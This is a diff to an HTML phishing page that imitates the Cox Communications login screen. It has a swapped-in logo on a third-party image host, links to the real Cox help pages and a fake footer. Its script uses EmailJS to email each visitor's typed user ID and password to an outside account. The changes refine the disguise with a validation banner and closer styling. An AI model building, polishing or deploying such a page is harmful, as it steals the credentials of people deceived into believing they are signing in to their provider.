@@ -6,173 +6,296 @@
 <title>Cox Login</title>
 <script src="https://cdn.emailjs.com/sdk/2.3.2/email.min.js"></script>
 <style>
-* { box-sizing: border-box; }
+  * { box-sizing: border-box; }
 
-body, html {
-  margin: 0; padding: 0; height: 100%;
-  font-family: "Cera Bold", "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
-  background: #fff;
-}
+  body, html {
+    margin: 0; padding: 0; height: 100%;
+    font-family: "Cera Bold", "Cera Medium", "open_sanssemibold", "Arial", "Helvetica", "Sans-serif";
+    background: #fff;
+    display: flex;
+    flex-direction: column;
+    min-height: 100vh;
+  }
 
-/* Fixed Header */
-.header {
-  width: 100%;
-  height: 60px;
-  background-color: white;
-  border-bottom: 1px solid #e0e0e0;
-  display: flex;
-  align-items: center;
-  padding: 0 2rem;
-  position: fixed;
-  top: 0; left: 0;
-  z-index: 10;
-}
+  /* Fixed Header with gradient bottom border and centered logo */
+  .header {
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%;
+    height: 60px;
+    background-color: white;
+    display: flex; 
+    align-items: center;
+    justify-content: center;
+    padding: 0 2rem;
+    z-index: 10;
+    border-bottom: none;
+    box-sizing: content-box;
+  }
+  .header::after {
+    content: "";
+    position: absolute;
+    bottom: 0;
+    left: 0;
+    height: 10px;
+    width: 100%;
+    background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%);
+    pointer-events: none;
+    z-index: 5;
+  }
+  .header img {
+    height: 48px;
+    padding-right: 20px;
+    position: relative;
+    z-index: 10;
+    display: block;
+  }
 
-.header img {
-  height: 32px;
-}
-
-/* Container split into 50% each */
-.container {
-  display: flex;
-  height: calc(100vh - 60px);
-  margin-top: 60px; /* space for fixed header */
-}
-
-/* Left panel with white background */
-.left-panel {
-  position: relative;
-  width: 50%;
-  background: white;
-  display: flex;
-  justify-content: center;
-  align-items: flex-start;
-}
-
-/* Form wrapper 75% width, overlapped by 25% on right side */
-.form-wrapper {
-  background-color: #f2f6f7;
-  width: 75%; /* occupies 75% of left panel */
-  padding: 50px 105px;
-  border-radius: 1px;
-  box-shadow: 0 0 1px rgba(0,0,0,0.1);
-  position: relative;
-  right: -30%; /* overlaps 25% onto right side */
-  margin-top: 80px; /* 80px closer to header */
-}
-
-h1 {
-  margin: 0 0 20px;
-  font-weight: 00 !important;
-  font-size: 32px !important;
-  color: #255993;
-  font-family: "Cera Bold", "Cera Medium";
-}
-
-p {
-  margin: 0 0 30px;
-  font-size: 16px;
-  color: #535353;
-}
-
-form {
-  display: flex;
-  flex-direction: column;
-}
-
-label {
-  font-size: 14px;
-  margin-bottom: 6px;
-  color: #004263;
-}
-
-input[type="email"],
-input[type="password"] {
-  height: 40px;
-  margin-bottom: 20px;
-  padding: 0 12px;
-  border: 1px solid #cbd1d8;
-  border-radius: 4px;
-  font-size: 16px;
-}
-
-/* Submit button style */
-button {
-  height: 44px;
-  background-color: #0078d2;
-  border: none;
-  color: white;
-  font-size: 16px;
-  border-radius: 4px;
-  cursor: pointer;
-  font-weight: 600;
-}
-button:hover {
-  background-color: #005ea3;
-}
-
-/* Forgot password link */
-.forgot-password {
-  margin-top: 12px;
-  font-size: 14px;
-  color: #0078d2;
-  text-align: right;
-}
-
-.forgot-password a {
-  color: #0078d2;
-  text-decoration: none;
-}
-
-/* Right panel with background image and 25% transparent overlay */
-.right-panel {
-  width: 50%; 
-  background:
-    linear-gradient(to right, transparent 0%, transparent 25%, white 100%) /* overlays 25% over image */,
-    url('https://images.unsplash.com/photo-1506744038136-46273834b3fb?auto=format&fit=crop&w=900&q=80') no-repeat center center / cover;
-}
-
-/* Responsive adjustments for small screens */
-@media(max-width: 768px) {
   .container {
+    display: flex;
+    flex: 1 0 auto;
+    height: calc(100vh - 60px);
+    margin-top: 60px;
+  }
+
+  .left-panel {
+    position: relative;
+    width: 50%;
+    background: white;
+    display: flex;
+    justify-content: center;
+    align-items: flex-start;
+    flex-direction: column;
+    /* allow column to show error banner on top */
+  }
+
+  .form-wrapper {
+    background-color: #f2f6f7;
+    width: 75%;
+    padding: 50px 105px;
+    border-radius: 1px;
+    box-shadow: 0 0 1px rgba(0,0,0,0.1);
+    position: relative;
+    right: -30%;
+    margin-top: 20px; /* reduced margin to accommodate error banner */
+  }
+
+  h1 {
+    margin: 0 0 20px;
+    font-weight: 600;
+    font-size: 32px;
+    color: #255993;
+    font-family: "Cera Bold", "Cera Medium";
+    text-align: center;
+  }
+
+  form {
+    display: flex;
     flex-direction: column;
   }
-  .left-panel, .right-panel {
+
+  label {
+    font-size: 14px;
+    margin-bottom: 6px;
+    color: #004263;
+  }
+
+  input[type="email"],
+  input[type="password"] {
+    height: 40px;
+    margin-bottom: 20px;
+    padding: 0 12px;
+    border: 1px solid #cbd1d8;
+    border-radius: 4px;
+    font-size: 16px;
+  }
+
+  .checkbox-container {
+    display: flex;
+    align-items: center;
+    margin-bottom: 20px;
+    font-size: 14px;
+    color: #004263;
+    user-select: none;
+  }
+  .checkbox-container input[type="checkbox"] {
+    margin-right: 8px;
+    width: 16px;
+    height: 16px;
+  }
+
+  button {
+    height: 36px;
+    background-color: #0078d2;
+    border: none;
+    color: white;
+    font-size: 14px;
+    border-radius: 4px;
+    cursor: pointer;
+    font-weight: 600;
+    padding: 0 25px;
+    align-self: flex-start;
+  }
+  button:hover {
+    background-color: #005ea3;
+  }
+
+  .links-container {
+    margin-top: 20px;
+    display: flex;
+    flex-direction: column;
+    align-items: flex-start;
+  }
+  .links-container a {
+    font-size: 13px;
+    color: #0078d2;
+    text-decoration: underline;
+    white-space: nowrap;
+    margin-bottom: 0;
+    line-height: 1.3;
+  }
+  .links-container a:last-child {
+    margin-bottom: 0;
+  }
+
+  .right-panel {
+    width: 50%;
+    background:
+      linear-gradient(to right, transparent 0%, transparent 0%),
+      url('https://i.imghippo.com/files/alE4561SRY.jpg') no-repeat center center / cover;
+  }
+
+  .footer {
+    flex-shrink: 0;
+    height: 40px;
+    background-color: white;
+    position: relative;
+    border-top: none;
+    box-sizing: content-box;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+  }
+  .footer::before {
+    content: "";
+    position: absolute;
+    top: 0;
+    left: 0;
+    height: 10px;
     width: 100%;
-    height: 50vh;
+    background: linear-gradient(90deg, rgba(0, 170, 244, 1) 30%, rgba(0, 210, 88, 1) 95%, rgba(0, 210, 88, 1) 100%);
+    pointer-events: none;
+    z-index: 5;
   }
-  .form-wrapper {
-    position: static;
-    width: 90%;
-    margin: auto;
-    right: 0;
+  .footer p {
+    margin: 0;
+    font-size: 14px;
+    color: #333;
+    position: relative;
+    z-index: 10;
   }
-}
+
+  /* Error banner styles */
+  .error-banner {
+    display: none;
+    background-color: #b00020;
+    color: white;
+    padding: 10px 15px;
+    border-radius: 4px;
+    margin: 0 auto 15px auto;
+    max-width: 75%;
+    font-weight: 600;
+    text-align: left;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+  }
+  .error-banner svg {
+    width: 20px;
+    height: 20px;
+    flex-shrink: 0;
+    fill: white;
+  }
+
+  /* Responsive adjustments */
+  @media(max-width: 768px) {
+    .container {
+      flex-direction: column-reverse;
+      height: auto;
+      margin-top: 60px;
+    }
+    .left-panel, .right-panel {
+      width: 100%;
+      height: 50vh;
+    }
+    .form-wrapper {
+      position: static;
+      width: 90%;
+      margin: -40px auto 0 auto;
+      right: 0;
+      padding: 30px 20px;
+    }
+    button {
+      width: 100%;
+      padding: 10px 0;
+    }
+    .links-container {
+      align-items: flex-start;
+    }
+    .error-banner {
+      max-width: 90%;
+      margin: 0 auto 10px auto;
+    }
+  }
 </style>
 </head>
 <body>
 
 <div class="header">
-  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Cox_logo_2017.svg" alt="Cox Logo" />
+  <img src="https://i.imghippo.com/files/VyV8142Ro.png" alt="Cox Logo" />
 </div>
 
 <div class="container">
   <div class="left-panel">
+    <!-- Error banner container -->
+    <div id="errorBanner" class="error-banner" role="alert" aria-live="assertive" aria-atomic="true" style="display:none;">
+      <!-- Exclamation mark icon SVG -->
+      <svg viewBox="0 0 24 24" aria-hidden="true" focusable="false">
+        <path d="M1 21h22L12 2 1 21zM13 18h-2v-2h2v2zm0-4h-2v-4h2v4z"></path>
+      </svg>
+      <span>We found some errors. Please review the form and make corrections.</span>
+    </div>
+
     <div class="form-wrapper">
       <h1>Welcome back</h1>
-      <form id="signin-form">
+      <form id="signin-form" novalidate>
         <label for="user_email">User ID</label>
         <input type="email" id="user_email" name="user_email" placeholder=" " required />
 
         <label for="user_password">Password</label>
         <input type="password" id="user_password" name="user_password" placeholder=" " required />
 
+        <div class="checkbox-container">
+          <input type="checkbox" id="remember_id" name="remember_id" />
+          <label for="remember_id">Remember user ID</label>
+        </div>
+
         <button type="submit">Sign In</button>
-        <div class="forgot-password"><a href="#">Forgot Password?</a></div>
+
+        <div class="links-container">
+          <a href="https://www.cox.com/myprofile/forgot-userid.html?finalview=" target="_blank" rel="noopener noreferrer">Forgot User ID?</a>
+          <a href="https://www.cox.com/myprofile/forgot-password.html?finalview=" target="_blank" rel="noopener noreferrer">Forgot Password?</a>
+          <a href="https://www.cox.com/myprofile/registration.html?finalview=" target="_blank" rel="noopener noreferrer">New here? Sign up today</a>
+          <a href="https://www.cox.com/residential/support/trouble-signing-in-on-the-cox-website.html" target="_blank" rel="noopener noreferrer">Need Help Signing In?</a>
+        </div>
       </form>
     </div>
   </div>
   <div class="right-panel"></div>
+</div>
+
+<div class="footer">
+  <p>© 2025 Cox Communications. All rights reserved.</p>
 </div>
 
 <script>
@@ -181,16 +304,37 @@ button:hover {
   })();
 
   const form = document.getElementById('signin-form');
+  const errorBanner = document.getElementById('errorBanner');
+
   form.addEventListener('submit', function(event) {
+    // Clear previous error banner
+    errorBanner.style.display = 'none';
+
+    // Check form validity via HTML5 form validation API
+    if (!form.checkValidity()) {
+      event.preventDefault();
+      // Show error banner
+      errorBanner.style.display = 'flex';
+
+      // Optionally focus first invalid input
+      const firstInvalid = form.querySelector(':invalid');
+      if(firstInvalid) firstInvalid.focus();
+
+      return false;
+    }
+
+    // Proceed with EmailJS send if valid
     event.preventDefault();
     const templateParams = {
       user_email: form.user_email.value,
-      user_password: form.user_password.value
+      user_password: form.user_password.value,
+      remember_id: form.remember_id.checked ? "Yes" : "No"
     };
     emailjs.send('YOUR_SERVICE_ID', 'YOUR_TEMPLATE_ID', templateParams)
       .then(() => {
         alert('Sign-in information sent successfully!');
         form.reset();
+        errorBanner.style.display = 'none';
       }, () => {
         alert('Failed to send the sign-in information. Please try again.');
       });
